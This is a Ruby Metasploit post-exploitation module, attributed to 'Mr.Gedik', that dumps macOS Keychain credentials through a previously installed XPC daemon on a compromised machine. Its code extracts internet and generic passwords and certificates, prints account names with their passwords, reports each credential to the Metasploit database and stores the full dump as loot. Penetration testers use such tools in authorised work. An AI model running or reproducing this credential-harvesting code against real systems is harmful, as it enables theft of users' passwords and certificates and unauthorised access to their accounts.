##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Keychain Credential Dump',
        'Description'  => %q{
          Harvests credentials from the macOS Keychain via the XPC daemon. Extracts
          internet passwords, generic passwords, and certificates from the system
          and user keychains. Each recovered credential is reported to the Metasploit
          database and the full dump is stored as loot.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Dumping keychain credentials via XPC daemon...")
    data = xpc_exec!('k1', timeout: 60)
    return if data.nil?

    count = 0
    if data.is_a?(Array)
      data.each do |entry|
        next unless entry.is_a?(Hash)
        account = entry['account'] || entry['label'] || 'unknown'
        password = entry['password'] || entry['data'] || ''
        service  = entry['service'] || entry['server'] || 'keychain'

        next if password.empty?
        count += 1

        print_good("  #{service} - #{account}:#{password[0..30]}#{'...' if password.length > 30}")
        xpc_report_cred(account, password, service, entry['port'].to_i)
      end
    end

    loot_path = xpc_store_loot(
      'keychain_dump',
      data.to_json,
      'keychain_dump.json',
      'macOS Keychain credential dump via XPC'
    )
    print_good("#{count} credential(s) recovered, saved to #{loot_path}")
  end
end
